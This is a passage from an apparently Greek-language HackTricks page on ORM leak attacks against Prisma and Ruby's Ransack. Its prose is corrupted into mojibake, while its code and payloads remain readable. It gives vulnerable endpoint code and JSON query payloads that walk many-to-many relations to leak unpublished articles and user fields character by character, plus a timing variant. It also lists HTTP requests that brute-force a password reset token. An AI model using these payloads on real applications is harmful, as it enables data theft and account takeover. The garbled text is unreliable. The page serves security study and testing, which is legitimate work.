* **Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï†Î¹Î»Ï„ÏÎ±ÏÎ¯ÏƒÎ¼Î±Ï„Î¿Ï‚ ÏƒÏ‡Î­ÏƒÎµÏ‰Î½ Ï€Î¿Î»Î»Î±Ï€Î»ÏÎ½ Ï€ÏÎ¿Ï‚ Ï€Î¿Î»Î»Î±Ï€Î»Î­Ï‚:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î½ Î¼Î· Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏ…Î¼Î­Î½Î± Î¬ÏÎ¸ÏÎ± ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†Î¿Î½Ï„Î±Ï‚ ÏƒÏ„Î¹Ï‚ Ï€Î¿Î»Î»Î­Ï‚-Ï€ÏÎ¿Ï‚-Ï€Î¿Î»Î»Î­Ï‚ ÏƒÏ‡Î­ÏƒÎµÎ¹Ï‚ Î¼ÎµÏ„Î±Î¾Ï `Category` -\[\*..\*]-> `Article`:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î½ ÏŒÎ»Î¿Î¹ Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ ÏƒÏ‡Î­ÏƒÎµÎ¹Ï‚ many-to-many Î¼Îµ loop back:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Error/Timed queries**: Î£Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± Ï€Î¿Î»Ï ÎµÎºÏ„ÎµÎ½Î­Ï‚ ÏƒÏÎ½Î¿Î»Î¿ Î´Î¿ÎºÎ¹Î¼ÏÎ½ Ï€Î¿Ï… Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎ±Î½ Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ Ï„Î¿ Î²Î­Î»Ï„Î¹ÏƒÏ„Î¿ payload Î³Î¹Î± Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î¼Îµ Î­Î½Î± payload Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÏ„Î¿Î½ Ï‡ÏÏŒÎ½Î¿. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
ÎŒÏ€Î¿Ï… Ï„Î¿ `{CONTAINS_LIST}` ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Î¼Îµ 1000 ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ­Ï‚ Î³Î¹Î± Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¹ÏƒÏ„ÎµÎ¯ ÏŒÏ„Î¹ Î· **Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· ÎºÎ±Î¸Ï…ÏƒÏ„ÎµÏÎµÎ¯ ÏŒÏ„Î±Î½ Î²ÏÎµÎ¸ÎµÎ¯ Î· ÏƒÏ‰ÏƒÏ„Î® Î´Î¹Î±ÏÏÎ¿Î®.**

## **Ransack (Ruby)**

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î²ÏÎ­Î¸Î·ÎºÎ±Î½ ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ [**Î±Î½Î¬ÏÏ„Î·ÏƒÎ·**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ Ransack 4.0.0.0 ÎµÏ€Î¹Î²Î¬Î»Î»ÎµÎ¹ Ï€Î»Î­Î¿Î½ Ï„Î· Ï‡ÏÎ®ÏƒÎ· ÏÎ·Ï„Î®Ï‚ Î»Î¯ÏƒÏ„Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎµÏ€ÏŒÎ¼ÎµÎ½Ï‰Î½ Î³Î¹Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎ¹Î¼Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ ÎºÎ±Î¹ ÏƒÏ…ÏƒÏ‡ÎµÏ„Î¯ÏƒÎµÎ¹Ï‚.**
{% endhint %}

**Î•Ï…Î¬Î»Ï‰Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ Ï€ÏÏ‚ Ï„Î¿ ÎµÏÏÏ„Î·Î¼Î± Î¸Î± ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¹Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ Ï€Î¿Ï… Î¸Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚. Î‰Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒÎ½, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î½Î± Î³Î¯Î½ÎµÎ¹ brute-force Ï„Î¿ token ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ Î¼Îµ:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
ÎœÎµ brute-forcing ÎºÎ±Î¹ Ï€Î¹Î¸Î±Î½Î­Ï‚ ÏƒÏ‡Î­ÏƒÎµÎ¹Ï‚, Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î½ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Ï€ÏŒ Î¼Î¹Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
